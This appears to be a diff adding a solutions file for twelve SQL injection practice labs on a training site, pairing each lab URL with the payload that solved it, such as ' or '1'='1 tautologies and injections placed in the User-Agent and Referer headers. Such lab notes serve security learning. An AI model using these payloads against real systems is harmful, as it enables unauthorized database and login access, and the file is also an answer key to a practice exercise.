@@ -1,0 +1,59 @@
+SQLi 01:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_1/lab_1.php
+Payload = 1" OR "1"="1 --
+
+SQLi 02:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_2/lab_2.php?id=3%22%20OR%20%221%22=%221%20
+Payload = id=3" OR "1"="1 --
+
+SQLi 03:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_3/lab_3.php?id=1%22%20OR%20%221%22=%221%20
+Payload = id=3" OR "1"="1 --
+
+SQLi 04:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_4/lab_4.php
+Payload = 1' || '1'= '1
+
+SQLi 05:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_5/lab_5.php?id=3%22%20AND%20%221%22=%221%22
+Payload = id=3" OR "1"="1 --
+
+SQLi 06:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_6/lab_6.php
+Payload = ") or ("1")=("1
+
+SQLi 07:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_7/lab_7.php
+Payload = ' or '1'='1
+
+SQLi 08:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_8/lab_8.php
+Payload = use paylaod at the end of user agent in BurpSuite: " AND 1=1 #
+
+SQLi 09:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_9/lab_9.php
+Payload = use paylaod at the end of referrer in BurpSuite: ' OR '1'='1 #
+
+SQLi 10:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_10/lab_10.php
+Payload = 1" OR "1"="1
+
+SQLi 11:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_11/lab_11.php?id=4
+Payload = ?id=4
+
+SQLi 12:
+
+URL = https://labs.hacktify.in/HTML/sqli_lab/lab_12/lab_12.php?id=8
+Payload = ?id=8
